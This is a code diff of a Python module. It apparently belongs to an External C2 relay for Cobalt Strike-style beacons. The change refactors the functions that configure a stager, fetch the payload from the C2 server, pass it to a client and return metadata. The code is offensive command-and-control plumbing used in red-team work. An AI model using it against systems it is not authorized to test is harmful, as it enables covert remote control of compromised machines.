@@ -1,70 +1,75 @@
 import config
 from utils import commonUtils
 
+
 def configureOptions(sock, arch, pipename, block):
-	# This whole function should eventually be refactored into an elaborate forloop so that we can
-	#   support additional beacon options down the road
-	# send the options
-	if config.verbose:
-		print commonUtils.color("Configuring stager options")
+    # This whole function should eventually be refactored into an elaborate forloop so that we can
+    #   support additional beacon options down the road
+    # send the options
+    if config.verbose:
+        print commonUtils.color("Configuring stager options")
 
-	beacon_arch = "arch=" + str(arch)
-	if config.debug:
-		print commonUtils.color(beacon_arch, status=False, yellow=True)
-	commonUtils.sendFrameToC2(sock, beacon_arch)
+    beacon_arch = "arch=" + str(arch)
+    if config.debug:
+        print commonUtils.color(beacon_arch, status=False, yellow=True)
+    commonUtils.sendFrameToC2(sock, beacon_arch)
 
-	beacon_pipename = "pipename=" + str(pipename)
-	if config.debug:
-		print commonUtils.color(beacon_pipename, status=False, yellow=True)
-	commonUtils.sendFrameToC2(sock, beacon_pipename)
+    beacon_pipename = "pipename=" + str(pipename)
+    if config.debug:
+        print commonUtils.color(beacon_pipename, status=False, yellow=True)
+    commonUtils.sendFrameToC2(sock, beacon_pipename)
 
-	beacon_block = "block=" + str(block)
-	if config.debug:
-		print commonUtils.color(beacon_block, status=False, yellow=True)
-	commonUtils.sendFrameToC2(sock, beacon_block)
+    beacon_block = "block=" + str(block)
+    if config.debug:
+        print commonUtils.color(beacon_block, status=False, yellow=True)
+    commonUtils.sendFrameToC2(sock, beacon_block)
+
 
 def requestStager(sock):
-	commonUtils.sendFrameToC2(sock, "go")
+    commonUtils.sendFrameToC2(sock, "go")
 
-	stager_payload = commonUtils.recvFrameFromC2(sock)
+    stager_payload = commonUtils.recvFrameFromC2(sock)
 
-	return stager_payload
+    return stager_payload
 
-def loadStager(sock):
-	# Send options to the external_c2 server
-	configureOptions(sock, config.C2_ARCH, config.C2_PIPE_NAME, config.C2_BLOCK_TIME)
 
-	if config.debug:
-		print commonUtils.color("stager configured, sending 'go'", status=False, yellow=True)
+def loadStager(beacon_obj):
+    # Send options to the external_c2 server
+    configureOptions(beacon_obj.sock, config.C2_ARCH, config.C2_PIPE_NAME, beacon_obj.block_time)
 
-	# Request stager
-	stager_payload = requestStager(sock)
+    if config.debug:
+        print commonUtils.color("stager configured, sending 'go'", status=False, yellow=True)
 
-	if config.debug:
-		print (commonUtils.color("STAGER: ", status=False, yellow=True) + "%s") % (stager_payload)
+    # Request stager
+    stager_payload = requestStager(beacon_obj.sock)
 
-	# Prep stager payload
-	if config.verbose:
-		print commonUtils.color("Encoding stager payload")
-		# Trick, this is actually done during sendData()
+    if config.debug:
+        print (commonUtils.color("STAGER: ", status=False, yellow=True) + "%s") % (stager_payload)
 
-	# Send stager to the client
-	if config.verbose:
-		print commonUtils.color("Sending stager to client")
-	commonUtils.sendData(stager_payload)
+    # Prep stager payload
+    if config.verbose:
+        print commonUtils.color("Encoding stager payload")
+    # Trick, this is actually done during sendData()
 
-	# Rrieve the metadata we need to relay back to the server
-	if config.verbose:
-		print commonUtils.color("Awaiting metadata response from client")
-	metadata = commonUtils.retrieveData()
+    # Send stager to the client
+    if config.verbose:
+        print commonUtils.color("Sending stager to client")
+    # Need to make a data frame here
+    raw_stager_frame = [beacon_obj.beacon_id, stager_payload]
+    commonUtils.sendData(raw_stager_frame)
 
-	# Send the metadata frame to the external_c2 server
-	if config.verbose:
-		print commonUtils.color("Sending metadata to c2 server")
-	if config.debug:
-		print (commonUtils.color("METADATA: ", status=False, yellow=True) + "%s") % (metadata)
-	commonUtils.sendFrameToC2(sock, metadata)
+    # Retrieve the metadata we need to relay back to the server
+    if config.verbose:
+        print commonUtils.color("Awaiting metadata response from client")
+    metadata = commonUtils.retrieveData(beacon_obj.beacon_id)
 
-	# Pretend we have error handling, return 0 if everything is Gucci
+    # Send the metadata frame to the external_c2 server
+    if config.verbose:
+        print commonUtils.color("Sending metadata to c2 server")
+    if config.debug:
+        print (commonUtils.color("METADATA: ", status=False, yellow=True) + "%s") % (metadata)
+    commonUtils.sendFrameToC2(beacon_obj.sock, metadata[1])
 
-	return 0
+    # Pretend we have error handling, return 0 if everything is Gucci
+
+    return 0
